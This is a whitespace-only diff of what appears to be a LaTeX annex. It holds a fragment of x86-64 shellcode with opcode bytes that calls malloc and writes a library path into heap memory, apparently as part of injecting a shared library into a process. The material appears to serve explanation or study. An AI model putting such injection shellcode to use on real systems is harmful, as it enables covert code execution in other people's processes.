@@ -1,6 +1,6 @@
 %----------
 %	ANEX
-%----------	
+%----------
 
 %
 
@@ -152,12 +152,12 @@ push rsi  # 56
 
 # Call malloc. Get address in the heap
 mov edi,0x2000 # BF00200000
-mov rbx, <malloc address libc>  # 48BB<address little endian 64bit>               
+mov rbx, <malloc address libc>  # 48BB<address little endian 64bit>
 call rbx  # FFD3
 mov rbx, rax  # 4889C3
 
 # Write the string of the library path into reserved memory
-mov dword [rax],0x6d6f682f  # C7002F686F6D 
+mov dword [rax],0x6d6f682f  # C7002F686F6D
 mov dword [rax+0x4],0x736f2f65  # C74004652F6F73
 mov dword [rax+0x8],0x65786f62  # C74008626F7865
 mov dword [rax+0xc],0x46542f73  # C7400C732F5446
